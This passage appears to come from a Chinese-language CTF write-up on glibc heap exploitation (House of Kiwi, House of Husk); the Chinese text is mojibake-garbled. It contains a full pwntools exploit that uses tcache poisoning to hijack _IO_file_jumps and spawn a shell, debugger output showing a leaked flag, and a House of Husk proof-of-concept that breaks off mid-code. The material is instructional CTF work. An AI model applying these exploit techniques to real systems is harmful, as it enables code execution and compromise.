</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">â–º <span class="hljs-number">0x7ffff7e2d0dd</span> &lt;setcontext+<span class="hljs-number">61</span>&gt;     mov    rsp, qword ptr [rdx + <span class="hljs-number">0xa0</span>]   &lt;<span class="hljs-number">0x7ffff7fc1940</span>&gt;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>_IO_helper_jumps + 0xA8</code> å¸ƒç½®çš„ rcxï¼Œä¹Ÿå°±æ˜¯è¢« push è¿›æ ˆï¼Œç»“æŸå ret å–åˆ°çš„ <code>rip = ret</code>ï¼š</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526175716709.png" alt="image-20220526175716709" style="zoom:67%;" /> <p>å†å¾€ä¸‹èµ°å°±åˆ°äº† ROP é“¾äº†ï¼Œä¸åšè¿‡å¤šè°ƒè¯•å±•ç¤ºï¼š</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526180101385.png" alt="image-20220526180101385" style="zoom:67%;" /><p>æœ€åä¹Ÿæ˜¯æˆåŠŸåœ°æ‰§è¡Œäº†æˆ‘ä»¬çš„é“¾å­ï¼Œorw å‡ºäº† flagã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[DEBUG] Received 0xdc bytes:<br>    <span class="hljs-string">&quot;ez_kiwi: malloc.c:2379: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&#x27; failed.\n&quot;</span><br>ez_kiwi: malloc.c:2379: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)<span class="hljs-string">&#x27; failed.</span><br><span class="hljs-string">[DEBUG] Received 0x30 bytes:</span><br><span class="hljs-string">    00000000  63 61 66 66  65 31 6e 65  7b 74 65 73  74 5f 66 6c  â”‚caffâ”‚e1neâ”‚&#123;tesâ”‚t_flâ”‚</span><br><span class="hljs-string">    00000010  61 67 7e 51  77 51 7e 7e  7e 7d 0a 00  00 00 00 00  â”‚ag~Qâ”‚wQ~~â”‚~&#125;Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="hljs-string">    00000020  40 65 e6 f7  ff 7f 00 00  10 d0 55 55  55 55 00 00  â”‚@eÂ·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·UUâ”‚UUÂ·Â·â”‚</span><br><span class="hljs-string">    00000030</span><br><span class="hljs-string">caffe1ne&#123;test_flag~QwQ~~~&#125;</span><br><span class="hljs-string">\x00\x00\x00e\x7f\x00\x10UUUU\x00</span><br></code></pre></td></tr></table></figure><h6 id="æ²¡æ²™ç®±çš„ç®€å•æƒ…å½¢"><a class="header-anchor" href="#æ²¡æ²™ç®±çš„ç®€å•æƒ…å½¢">Â¶</a>æ²¡æ²™ç®±çš„ç®€å•æƒ…å½¢</h6><p>ä¸»è¦æ˜¯ææ¸…æ¥šè¿™ä¸ªåˆ©ç”¨è·¯çº¿ï¼Œæ˜ç™½å•¥æ—¶å€™ ğŸ‘ æŒ‡å®šçš„å‡½æ•°æŒ‡é’ˆã€‚</p><p>å› ä¸ºæ¯”èµ›æ—¶é¢˜ç›®æ²¡å¼€æ²™ç®±ï¼Œè€Œä¸”æ˜¯ <strong>2.31</strong> ç‰ˆæœ¬çš„ libcï¼Œä¸‹é¢æ˜¯æŠŠ <strong>__sync</strong> ç›´æ¥æ¢æˆ <code>system</code> å‡½æ•°ï¼Œåœ¨ stderr å†™ <code>/bin/sh\0</code> çš„æ›´ç®€å•æƒ…å½¢ã€‚</p><p>è¿™é‡Œèµ° kiwi ğŸ‘ çš„æ˜¯ <strong>main_arena -&gt; top</strong> ï¼Œå°±<strong>ä¸éœ€è¦ leak å †åœ°å€</strong>äº†ã€‚å½“ç„¶ leak å †åœ°å€å¯ä»¥åå»åŠ«æŒ <strong>Tcache Struct</strong> ç„¶åçå‡ æŠŠ ğŸ‘ ä½†æ˜¯ ğŸ‘´ æœ€è¿‘å‡ å¤©ç© Tcache ç©ç´¯äº†å°±æ²¡æ‰“äº†ã€‚ä½†å¦‚æœæ˜¯ <strong>2.32</strong> ä»¥ä¸Šç‰ˆæœ¬ï¼Œç”±äº<a href="https://caffeine.darkflow.top/posts/d6d32804.html">æŒ‡é’ˆå¼‚æˆ–æœºåˆ¶</a>ï¼Œè¿˜æ˜¯å¿…é¡»è¦ leakã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.31/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,<span class="hljs-built_in">id</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;How much do you want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Which one do you want to put?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Tell me your idea:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to remove?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to look?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to change?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Change your idea:&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    menu(<span class="hljs-number">666</span>)<br><br><span class="hljs-comment"># flag_addr = heap_base + 0x2a0</span><br>sla(<span class="hljs-string">&#x27;Before the game starts, please give me your name:\n&#x27;</span>,<span class="hljs-string">&#x27;./flag\0&#x27;</span>)<br><br><span class="hljs-comment"># Easy Heap Fengshui</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">3</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">4</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">5</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">6</span>) <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>) <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>) <span class="hljs-comment"># 8</span><br><br><span class="hljs-comment"># chunk1 -&gt; size = 0x40</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x41&#x27;</span>)<br>dele(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># chunk2 -&gt; size = 0x460 Create a unsortedbin</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>*<span class="hljs-number">4</span> + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>dele(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Leak libc</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ebf75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>__sync = libc.sym._IO_file_jumps + <span class="hljs-number">0x60</span><br>_IO_helper_jumps = libc_base + <span class="hljs-number">0x1ec8a0</span><br><br><span class="hljs-comment"># Tcache Poisoning1 _IO_file_jumps -&gt; __sync = system</span><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(__sync) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>,p64(libc.sym.system))<br><br><span class="hljs-comment"># Tcache Poisoning2 _IO_2_1_stderr_ -&gt; _flags = &#x27;/bin/sh\0&#x27;</span><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(libc.sym._IO_2_1_stderr_) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br><br><span class="hljs-comment"># Tcache Poisoning3 main_arena -&gt; top = &amp;main_arena - 0x10 </span><br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(libc_base + <span class="hljs-number">0x1ebbe0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>,p64(libc_base + <span class="hljs-number">0x1ebbe0</span> - <span class="hljs-number">96</span> - <span class="hljs-number">16</span>)*<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Trigger kiwi ~~</span><br>gift()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">In file: /home/caffe1ne/Exps/Glibc/glibc<span class="hljs-number">-2.31</span>/libio/iofflush.c<br>   <span class="hljs-number">34</span>     <span class="hljs-keyword">return</span> _IO_flush_all ();<br>   <span class="hljs-number">35</span>   <span class="hljs-keyword">else</span><br>   <span class="hljs-number">36</span>     &#123;<br>   <span class="hljs-number">37</span>       <span class="hljs-type">int</span> result;<br>   <span class="hljs-number">38</span>       CHECK_FILE (fp, EOF);<br> â–º <span class="hljs-number">39</span>       _IO_acquire_lock (fp);<br>   <span class="hljs-number">40</span>       result = _IO_SYNC (fp) ? EOF : <span class="hljs-number">0</span>;<br>   <span class="hljs-number">41</span>       _IO_release_lock (fp);<br>   <span class="hljs-number">42</span>       <span class="hljs-keyword">return</span> result;<br>   <span class="hljs-number">43</span>     &#125;<br>   <span class="hljs-number">44</span> &#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿è¡Œ <strong>_IO_SYNC (fp)</strong> æ—¶è¿è¡Œçš„å°±æ˜¯ <code>system('/bin/sh')</code> ã€‚</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526182847525.png" alt="image-20220526182847525" style="zoom:67%;" /><hr><h3 id="House-of-Husk"><a class="header-anchor" href="#House-of-Husk">Â¶</a>House of Husk</h3><p>è¿™æ¡åˆ©ç”¨è·¯çº¿æ¯”è¾ƒç®€å•ï¼Œæ¡ä»¶æ˜¯ä¿©æ¬¡ä»»æ„å†™æˆ–è€…ä¿©æ¬¡ Largebin Attackã€‚</p><h4 id="åŸç†-v2"><a class="header-anchor" href="#åŸç†-v2">Â¶</a>åŸç†</h4><p><strong>printf_positional</strong> çš„ <strong>printf-parsemb</strong> å‡½æ•°ä¸­å¯¹å¤„ç†å„ç§æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ‡è¯†ç¬¦( <code>%p</code>,<code>%X</code> ç­‰)ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Get the format specification.  */</span><br>spec-&gt;info.spec = (<span class="hljs-type">wchar_t</span>) *format++;<br>spec-&gt;size = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> (__builtin_expect (__printf_function_table == <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>)<br>    || spec-&gt;info.spec &gt; UCHAR_MAX<br>    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="hljs-literal">NULL</span><br>    <span class="hljs-comment">/* We don&#x27;t try to get the types for all arguments if the format</span><br><span class="hljs-comment">uses more than one.  The normal case is covered though.  If</span><br><span class="hljs-comment">the call returns -1 we continue with the normal specifiers.  */</span><br>    || (<span class="hljs-type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])<br>   (&amp;spec-&gt;info, <span class="hljs-number">1</span>, &amp;spec-&gt;data_arg_type,<br>    &amp;spec-&gt;size)) &lt; <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>å½“ <code>__printf_function_table != NULL</code> å¹¶ä¸” <code>__printf_arginfo_table[sepc] != NULL</code> æ—¶ï¼Œä¼šè°ƒç”¨ <code>__printf_function_table[(size_t) spec]</code> å¤„çš„å‡½æ•°ã€‚</p><p>æŒ‡å®šæ ‡è¯†ç¬¦åç§»è®¡ç®—ï¼Œä»¥ â€˜Xâ€™ ä¸ºä¾‹ï¼š<br>$$<br>(ord(char) -2)*8\<br>(ord(â€˜Xâ€™)-2)<em>8=86</em>8=688=0x2b0<br>$$<br>ç›¸åº”çš„æˆ‘ä»¬å¾—åˆ°æœ€å¸¸ç”¨åˆ°çš„ <code>%s</code> åç§»ä¸º <strong>0x388</strong> ã€‚</p><p>æ³¨æ„è¿™é‡Œ <strong>-2</strong> æ˜¯å› ä¸ºä»å†…å­˜åŒºåŸŸ<strong>è€Œä¸æ˜¯chunkå¤´</strong>è®¡ç®—ï¼Œä» chunk å¤´éƒ¨è®¡ç®—å°±ä¸è¦å‡äºŒäº†ã€‚ä¾‹å¦‚ <code>%s</code> ä¸º $ord(â€˜sâ€™)*8=0x398$ ï¼ŒğŸ‘´ å°±æ˜¯è¢«è¿™ç©æ„å‘äº†ï¼Œä¸å¸Œæœ›å¤§ ğŸ”¥ ä¹Ÿä¸Šå½“å—éª—ã€‚</p><h4 id="ä½¿ç”¨åœºæ™¯-v2"><a class="header-anchor" href="#ä½¿ç”¨åœºæ™¯-v2">Â¶</a>ä½¿ç”¨åœºæ™¯</h4><p>èƒ½æ§åˆ¶ <strong>__printf_arginfo_table,__printf_function_table</strong> ä¸ºå †åœ°å€ï¼Œä»¥åœ¨åˆ¶å®šåç§»å¤„å†™æˆ‘ä»¬çš„ç›®æ ‡å‡½æ•°ï¼Œè¿™ä¿©å¼ è¡¨éƒ½èƒ½å†™å‡½æ•°ï¼Œè°ƒç”¨ä½ç½®ä¸åŒã€‚</p><p><strong>one_gadget</strong> èµ·æ•ˆæ—¶ï¼Œ<strong>husk</strong> æœ‰å¥‡æ•ˆï¼Œéå¸¸å¥½ç”¨ã€‚ä¸èµ·æ•ˆæˆ–å¼€äº†æ²™ç®±æ—¶ï¼Œå¯ä»¥åœ¨å‡½æ•°è¡¨å†™ <strong>exit</strong> è¿›å…¥ exit æµç¨‹ï¼Œé…åˆå…¶ä»–é«˜ç‰ˆæœ¬ house ä½¿ç”¨ã€‚</p><h4 id="Demo-v3"><a class="header-anchor" href="#Demo-v3">Â¶</a>Demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ptr-yudai/House-of-Husk/blob/master/poc-husk.c</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Husk&#x27;s method - House of Husk</span><br><span class="hljs-comment"> * This PoC is supposed to be run with libc-2.27</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAIN_ARENA       0x3ebc40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAIN_ARENA_DELTA 0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINTF_FUNCTABLE 0x3f0658</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINTF_ARGINFO   0x3ec870</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ONE_GADGET       0x10a38c</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> libc_base;<br>  <span class="hljs-type">char</span> *a[<span class="hljs-number">10</span>];<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// make printf quiet</span><br><br>  <span class="hljs-comment">/* leak libc */</span><br>  a[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* UAF chunk */</span><br>  a[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));<br>  a[<span class="hljs-number">2</span>] = <span class="hljs-built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));<br>  a[<span class="hljs-number">3</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* avoid consolidation */</span><br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">0</span>]);<br>  libc_base = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)a[<span class="hljs-number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);<br><br>  <span class="hljs-comment">/* prepare fake printf arginfo table */</span><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(a[<span class="hljs-number">2</span>] + (<span class="hljs-string">&#x27;X&#x27;</span> - <span class="hljs-number">2</span>) * <span class="hljs-number">8</span>) = libc_base + ONE_GADGET;<br><br>  <span class="hljs-comment">/* unsorted bin attack */</span><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(a[<span class="hljs-number">0</span>] + <span class="hljs-number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="hljs-number">0x10</span>;<br>  a[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* overwrite global_max_fast */</span><br><br>  <span class="hljs-comment">/* overwrite __printf_arginfo_table */</span><br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">1</span>]);<br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-comment">/* ignite! */</span><br>  getchar();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%X&quot;</span>, <span class="hljs-number">0</span>);<br>  